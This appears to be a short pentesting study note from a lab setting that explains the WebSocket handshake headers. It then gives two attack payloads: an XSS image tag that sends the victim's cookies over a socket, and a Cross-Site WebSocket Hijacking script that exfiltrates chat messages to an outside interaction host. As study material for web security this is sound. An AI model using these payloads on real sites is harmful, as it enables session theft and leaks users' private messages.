
#### The WebSocket handshake is initiated with an HTTP request similar to this:
```http
GET /echo HTTP/1.1
Host: websockets.htb
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: 7QpTshdCiQfiv3tH7myJ1g==
Origin: http://websockets.htb
```
- The Connection header with the value Upgrade and the Upgrade header with the value websocket indicate the client's intent to establish a WebSocket connection
- The Sec-WebSocket-Version header contains the WebSocket protocol version chosen by the client, with the latest version being 13
- The Sec-WebSocket-Key header contains a unique value confirming that the client wants to establish a WebSocket connection; this header does not provide any security protections
- The Origin header contains the origin just like in regular HTTP requests and is used for security purposes.

#### The server responds with a response similar to the following:
```http
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: QU/gD/2y41z9ygrOaGWgaC+Pm2M=
```
- The HTTP status code of 101 indicates that the WebSocket connection establishment has been completed
- The Connection and Upgrade headers contain the same values as in the client's request, which is Upgrade and websocket, respectively
- The Sec-WebSocket-Accept header contains a value derived from the value sent by the client in the Sec-WebSocket-Key header and confirms that the server is willing to establish a WebSocket connection


## Xss through web sockets
for example send admin's cookies through socket chat
```html
<img src=x onerror="socket.send(document.cookie);"> 
```


## Cross-Site WebSocket Hijacking
```html
<script>
  function send_message(event){
    socket.send('!get_messages');
  };

  const socket = new WebSocket('ws://VulnHost:80/messages');
  socket.onopen = send_message;
  socket.addEventListener('message', ev => {
    fetch('http://ch23a202vtc0000138p0getbibyyyyyyb.oast.fun/', {method: 'POST', mode: 'no-cors', body: ev.data});
  });
</script>

```

**Note:** 


For this exploit to work, the SameSite cookie flag must be set to `None`. Since most browsers apply a default value of Lax if the SameSite cookie attribute is not set, the attack's success would require a deliberately insecure configuration by the web application administrator.
